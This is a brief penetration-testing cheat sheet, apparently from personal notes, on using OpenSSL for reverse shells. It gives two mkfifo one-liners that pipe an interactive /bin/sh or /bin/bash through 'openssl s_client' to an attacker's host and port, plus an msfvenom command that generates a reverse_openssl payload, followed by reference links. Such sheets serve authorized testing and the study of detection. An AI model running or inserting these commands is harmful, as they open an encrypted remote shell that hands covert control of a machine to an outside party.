# OpenSSL

## 01 - One-liners

```
$ mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | openssl s_client -quiet -connect <IP>:<PORT> > /tmp/f; rm /tmp/f

$ mkfifo /tmp/f; /bin/bash -i < /tmp/f 2>&1 | openssl s_client -quiet -connect <IP>:<PORT> > /tmp/f; rm /tmp/f
```

## 02 - Generate via `msfvenom`

```
$ msfvenom -p cmd/unix/reverse_openssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

---
## References

### Github

- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)

### Rio Asmara Suryadi

- [Rio Asmara Suryadi: OpenSSL for Reverse Shell](https://rioasmara.com/2020/06/22/openssl-for-reverse-shell/)

### Sandfly Security

- [Sandfly Security: Detecting and Investigating OpenSSL Backdoors on Linux](https://www.sandflysecurity.com/blog/detecting-and-investigating-openssl-backdoors-on-linux/)